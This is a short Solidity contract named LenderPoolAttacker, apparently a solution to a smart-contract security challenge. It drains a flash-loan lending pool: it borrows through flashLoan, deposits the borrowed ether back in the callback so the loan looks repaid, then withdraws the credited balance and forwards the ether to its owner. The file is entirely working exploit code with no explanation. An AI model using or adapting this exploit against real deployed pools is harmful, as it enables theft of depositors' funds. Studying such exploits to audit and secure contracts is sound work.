// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IFlashLoanEtherReceiver.sol";

interface IPool {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256 amount) external;
}

contract LenderPoolAttacker is IFlashLoanEtherReceiver {
  address immutable _owner;
  IPool immutable _pool;
  uint256 valueToDeposit;
  constructor(address pool) {
    _owner = msg.sender;
    _pool = IPool(pool);
  }

  function attack(uint256 amount) public payable {
    require(msg.sender == _owner, "only owner");
    valueToDeposit = amount;
    _pool.flashLoan(amount);
    _pool.withdraw();
    (bool success, ) = _owner.call{value: amount}("");
    require(success, "amount must be sent");
  }

  function execute() external payable {
    _pool.deposit{value: valueToDeposit}();
  }

  receive() external payable {

  }
}